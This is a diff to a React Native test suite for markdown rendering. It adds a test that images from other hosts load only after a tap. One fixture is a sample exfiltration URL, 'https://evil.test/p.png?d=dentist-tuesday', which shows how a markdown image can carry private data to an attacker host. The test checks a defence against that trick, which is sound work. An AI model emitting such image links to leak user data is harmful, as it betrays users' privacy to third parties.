@@ -1,5 +1,5 @@
 import { StyleSheet, Text } from "react-native";
-import { render, within } from "@testing-library/react-native";
+import { fireEvent, render, within } from "@testing-library/react-native";
 
 import { MarkdownContent } from "@/components/MarkdownContent";
 import { makeRenderRules } from "@/components/markdown/markdownRenderRules";
@@ -303,15 +303,27 @@ describe("markdown render rules", () => {
     expect(queryByText("2.")).toBeNull();
   });
 
-  it("renders allowed markdown images through the memory-disk cache", async () => {
+  it("renders inline markdown images through the memory-disk cache", async () => {
+    const tri = "data:image/png;base64,iVBORw0KGgo=";
     const { getByLabelText } = await render(
-      <MarkdownContent content={"![A red triangle](https://example.com/tri.png)"} />,
+      <MarkdownContent content={`![A red triangle](${tri})`} />,
     );
     const image = getByLabelText("A red triangle");
     expect(image).toBeOnTheScreen();
-    expect(image.props.source).toEqual({ uri: "https://example.com/tri.png" });
+    expect(image.props.source).toEqual({ uri: tri });
     expect(image.props.contentFit).toBe("contain");
     expect(image.props.cachePolicy).toBe("memory-disk");
+  });
+
+  it("loads another host's image only after a tap, naming the host first", async () => {
+    const exfil = "https://evil.test/p.png?d=dentist-tuesday";
+    const view = await render(<MarkdownContent content={`![status](${exfil})`} />);
+    expect(view.queryByRole("image")).toBeNull();
+    const card = view.getByTestId("tap-to-load-image");
+    expect(within(card).getByText("status")).toBeOnTheScreen();
+    await fireEvent.press(card);
+    const image = view.getByLabelText("status");
+    expect(image.props.source).toEqual({ uri: exfil });
   });
 
   it.each([
